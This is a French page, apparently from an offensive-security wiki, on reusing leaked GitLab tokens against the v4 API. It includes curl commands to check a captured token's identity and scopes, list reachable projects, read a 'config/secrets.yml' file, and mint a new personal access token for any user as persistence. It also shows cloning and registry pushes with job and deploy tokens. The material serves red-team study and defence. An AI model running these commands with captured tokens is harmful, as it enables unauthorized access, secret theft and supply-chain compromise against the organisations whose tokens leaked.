---
title: "Abus de jetons"
order: 3
description: "Réutiliser des jetons d'accès personnels, de projet et de groupe GitLab, des jetons de déploiement et le jeton de job CI du pipeline contre l'API v4 : résoudre l'identité et la portée de chaque jeton, lire et écrire des dépôts, et pivoter entre projets via l'allowlist des jetons de job."
keywords:
  - jeton d'accès personnel
  - jeton d'accès de projet
  - jeton de déploiement
  - CI_JOB_TOKEN
  - PRIVATE-TOKEN
  - portée de jeton
---

# Abus de jetons

GitLab authentifie les appels d'API avec un en-tête, et plusieurs types de jetons partagent la même surface. Un jeton divulgué est immédiatement utilisable : vous n'avez pas besoin du mot de passe du compte ni d'une session. La tâche, dès qu'un jeton est trouvé, est de résoudre **ce qu'il est**, **en tant que qui il agit** et **ce qu'il peut faire**, puis d'agir dans ces limites.

- **Jeton d'accès personnel (PAT)** : agit comme un utilisateur, cadré par une liste telle que `api` (lecture/écriture complète), `read_api`, `read_repository`, `write_repository`. Envoyé comme `PRIVATE-TOKEN:` ou `Authorization: Bearer`.
- **Jeton d'accès de projet / de groupe** : agit comme un utilisateur bot lié à un projet ou groupe, avec un rôle (Developer, Maintainer) et des portées. Mêmes en-têtes.
- **Jeton de déploiement** : une paire nom d'utilisateur/mot de passe pour le clonage et le pull/push de registre, pas l'API complète. Utilisé dans les remotes git et `docker login`.
- **Jeton de job CI** (`CI_JOB_TOKEN`) : généré par job, agit avec l'identité de job de l'utilisateur déclencheur, atteint l'API pour les projets de l'allowlist, le registre et les releases. Envoyé comme `JOB-TOKEN:`.

## Résoudre l'identité et la portée d'abord

```bash
# PAT / project / group token: who does it act as?
curl -s https://gitlab.com/api/v4/user -H "PRIVATE-TOKEN: $TOKEN"
# -> {"username":"svc-bot","id":123,"is_admin":false,...}; a 401 means dead/revoked

# Exact scopes and expiry of the current token
curl -s https://gitlab.com/api/v4/personal_access_tokens/self -H "PRIVATE-TOKEN: $TOKEN"
# -> {"scopes":["api"],"active":true,"expires_at":"2026-12-31",...}
```

Une portée `api` et `is_admin:false` signifie quand même lecture/écriture complète sur chaque projet que l'utilisateur agissant peut atteindre. Un `401` sur `/user` signifie que le jeton est révoqué ou expiré ; un `403` sur une ressource spécifique signifie qu'il est valide mais sous-privilégié là.

## Énumérer et agir dans la portée

```bash
# Everything this token can reach, with the role it holds
curl -s "https://gitlab.com/api/v4/projects?membership=true&min_access_level=30&per_page=100" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq -r '.[] | "\(.path_with_namespace) \(.permissions.project_access.access_level)"'

# Read a file (write_repository/api can also commit)
curl -s "https://gitlab.com/api/v4/projects/<id>/repository/files/config%2Fsecrets.yml/raw?ref=main" \
  -H "PRIVATE-TOKEN: $TOKEN"

# Mint a PAT for any user as persistence. Instance-admin only (self-managed/dedicated):
# an ordinary api-scoped token gets 403 here, it needs admin credentials or an admin impersonation token.
curl -s -X POST "https://gitlab.com/api/v4/users/<id>/personal_access_tokens" \
  -H "PRIVATE-TOKEN: $ADMIN_TOKEN" -d "name=ci&scopes[]=api&expires_at=2027-01-01"
```

Le chemin de fichier encodé en URL (`config%2Fsecrets.yml`) est requis par l'API des fichiers ; `%2F` est le séparateur `/`. Une lecture brute réussie d'un fichier de secrets est un gain d'identifiants immédiat.

## Jeton de job CI et jeton de déploiement

```bash
# Job token: clone an allowlisted project
git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/<ns>/<project>.git
# Job token against the API: only the job-token-allowed endpoints, and only when the target
# project allowlists yours. Project read, artifacts, packages, and the registry are in scope;
# the CI/CD variables API is NOT, so a job token cannot read another project's variables.
curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/<id>"

# Deploy token: registry pull/push and clone, not the general API
echo "$DEPLOY_TOKEN_PASS" | docker login registry.gitlab.com -u "$DEPLOY_TOKEN_USER" --password-stdin
git clone https://$DEPLOY_TOKEN_USER:$DEPLOY_TOKEN_PASS@gitlab.com/<ns>/<project>.git
```

Un jeton de déploiement renvoie `404`/`401` contre `/api/v4/user` parce qu'il n'est pas un utilisateur ; testez-le plutôt contre un clone ou `docker login`. La portée du jeton de job est bornée à la fois par l'**allowlist des jetons de job CI/CD** de chaque projet cible et par l'ensemble fixe de endpoints qu'un jeton de job peut appeler (clone git, les registres de paquets et de conteneurs, les artefacts de job, les releases et la lecture de projet, mais pas l'API des variables CI/CD). Un `403` depuis un endpoint de l'allowlist tel que `GET /projects/:id` signifie que ce projet n'ajoute pas le vôtre à son allowlist.

## Suite

Un jeton de niveau Maintainer lit directement les variables CI/CD stockées (voir [reconnaissance](reconnaissance.md)) ; un jeton de niveau inférieur les exfiltre via l'[injection de pipeline CI/CD](ci-cd-pipeline-injection.md). Un PAT admin sur une instance auto-hébergée ouvre les chemins d'usurpation d'identité et de runner dans [exploits admin et API connus](known-admin-and-api-exploits.md). Un push de registre avec un jeton de déploiement ou de job est un pivot de supply-chain vers tout ce qui consomme l'image.

## Outils

- **glab auth login** pour stocker et réutiliser un jeton capturé à travers les commandes.
- **TruffleHog** pour confirmer qu'un jeton récupéré est actif avant de l'utiliser.

## Références

- [GitLab personal access tokens](https://docs.gitlab.com/ee/user/profile/personal_access_tokens.html)
- [GitLab project access tokens](https://docs.gitlab.com/ee/user/project/settings/project_access_tokens.html)
- [GitLab deploy tokens](https://docs.gitlab.com/ee/user/project/deploy_tokens/)
- [GitLab : personal access tokens API](https://docs.gitlab.com/ee/api/personal_access_tokens.html)
